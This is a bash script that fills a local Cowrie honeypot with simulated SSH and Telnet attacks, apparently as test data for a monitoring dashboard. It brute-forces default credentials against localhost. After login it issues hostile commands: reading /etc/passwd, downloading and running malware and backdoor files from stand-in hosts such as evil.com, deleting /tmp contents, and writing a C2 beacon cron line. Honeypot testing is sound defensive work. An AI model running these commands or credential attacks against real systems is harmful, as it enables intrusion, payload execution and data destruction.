#!/bin/bash

echo "🎯 Generating Attack Data..."

# Install required tools
echo "📦 Installing required tools..."
sudo apt update
sudo apt install -y sshpass expect

# Function to generate SSH attacks
generate_ssh_attacks() {
    echo "🔐 Generating SSH attacks..."
    
    # Common credentials
    credentials=(
        "root:admin"
        "admin:password"
        "user:123456"
        "guest:guest"
        "test:test"
        "ubuntu:ubuntu"
        "pi:raspberry"
        "oracle:oracle"
        "postgres:postgres"
        "mysql:mysql"
    )
    
    for cred in "${credentials[@]}"; do
        username=$(echo $cred | cut -d: -f1)
        password=$(echo $cred | cut -d: -f2)
        
        echo "  🔑 Attacking with $username:$password"
        
        # Try to connect and execute commands
        timeout 15 sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 "$username@localhost" << EOF 2>/dev/null
ls -la
cat /etc/passwd
ps aux
uname -a
whoami
id
wget http://malicious.example.com/malware.sh
chmod +x malware.sh
./malware.sh
curl -O http://evil.com/rootkit
rm -rf /tmp/*
echo "* * * * * curl -s http://c2.example.com/beacon" >> /tmp/cron
netstat -an
ss -tulpn
find / -name "*.conf" 2>/dev/null
cat /proc/version
mount
df -h
free -m
exit
EOF
        
        sleep 2
    done
}

# Function to generate Telnet attacks
generate_telnet_attacks() {
    echo "📞 Generating Telnet attacks..."
    
    credentials=(
        "root:admin"
        "admin:password"
        "user:123456"
    )
    
    for cred in "${credentials[@]}"; do
        username=$(echo $cred | cut -d: -f1)
        password=$(echo $cred | cut -d: -f2)
        
        echo "  📞 Telnet attack: $username:$password"
        
        expect << EOF 2>/dev/null
spawn telnet localhost 2223
expect "login:"
send "$username\r"
expect "Password:"
send "$password\r"
expect "$ "
send "ls -la\r"
expect "$ "
send "cat /etc/passwd\r"
expect "$ "
send "ps aux\r"
expect "$ "
send "uname -a\r"
expect "$ "
send "wget http://evil.example.com/backdoor\r"
expect "$ "
send "chmod +x backdoor\r"
expect "$ "
send "./backdoor\r"
expect "$ "
send "exit\r"
expect eof
EOF
        
        sleep 2
    done
}

# Check if Cowrie is running
if ! pgrep -f cowrie > /dev/null; then
    echo "❌ Cowrie is not running. Starting it..."
    sudo systemctl start cowrie
    sleep 5
fi

# Generate attacks
generate_ssh_attacks
generate_telnet_attacks

# Wait a moment for logs to be written
sleep 5

# Check if we have log data
echo ""
echo "📊 Checking generated data..."
if [ -f "./cowrie-logs/cowrie.json" ]; then
    echo "✅ Log file exists"
    echo "📄 Line count: $(wc -l < "./cowrie-logs/cowrie.json")"
    echo "📊 File size: $(du -h "./cowrie-logs/cowrie.json" | cut -f1)"
    
    if [ -s "./cowrie-logs/cowrie.json" ]; then
        echo "📝 Recent entries:"
        tail -5 "./cowrie-logs/cowrie.json" | jq . 2>/dev/null || tail -5 "./cowrie-logs/cowrie.json"
    fi
else
    echo "❌ No log file found"
fi

echo ""
echo "✅ Attack data generation complete!"
echo "📊 Check the dashboard at: http://localhost:3000"
